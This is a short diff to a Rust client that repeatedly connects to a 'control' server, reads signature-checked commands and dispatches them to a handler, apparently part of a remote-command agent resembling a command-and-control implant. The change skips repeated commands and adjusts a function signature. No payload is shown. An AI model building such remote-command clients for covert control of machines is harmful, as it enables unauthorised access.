@@ -32,6 +32,8 @@ async fn main() -> Result<(), Box<dyn Error>> {
    let public_key = RsaPublicKey::from_pkcs1_pem(RSA_PUB_PEM).unwrap();
    let verify_key = VerifyingKey::<Sha256>::new(public_key);
 
+   let mut previous_command = String::from("");
+
     loop {
         let mut stream = get_stream().await;
         let (mut reader, mut writer) = stream.split();
@@ -69,8 +71,17 @@ async fn main() -> Result<(), Box<dyn Error>> {
 
         let command = String::from_utf8(buf).expect("Bad utf8"); // Make this not unwrap, just continue
         let command = command.trim_matches(char::from(0));
+
+        if previous_command == command {
+            sleep(Duration::from_millis(5000)).await;
+            continue;
+        } else {
+            previous_command = command.to_string();
+        }
+
         println!("Message from control: {}", &command[..]);
-        handle_command(command.to_string()).await;
+
+        handle_command(&command).await;
 
         writer.shutdown().await;
 
@@ -91,7 +102,7 @@ async fn get_stream() -> TcpStream {
     }
 }
 
-async fn handle_command(command: String) {
+async fn handle_command(command: &str) {
     let (command, args) = match command.split_once(" ") {
         Some((c, a)) => (c, a),
         None => (&command[..], ""),
